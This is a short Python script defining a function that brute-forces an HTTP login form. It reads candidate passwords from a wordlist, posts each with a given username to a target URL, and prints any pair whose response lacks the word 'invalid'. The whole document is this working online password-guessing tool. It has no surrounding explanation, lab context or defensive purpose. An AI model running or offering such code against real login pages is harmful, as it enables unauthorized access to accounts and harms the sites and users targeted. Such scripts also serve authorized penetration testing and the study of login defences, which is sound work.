import requests

def brute_force_http(url, username, wordlist):
    print(f"[HTTP] Target URL: {url}, User: {username}")
    for pwd in open(wordlist):
        payload = {'username': username, 'password': pwd.strip()}
        r = requests.post(url, data=payload)
        if "invalid" not in r.text.lower():
            print(f"[+] Success: {username}:{pwd.strip()}")
            return
        else:
            print(f"[-] Failed: {pwd.strip()}")
    print("[!] Done testing HTTP.")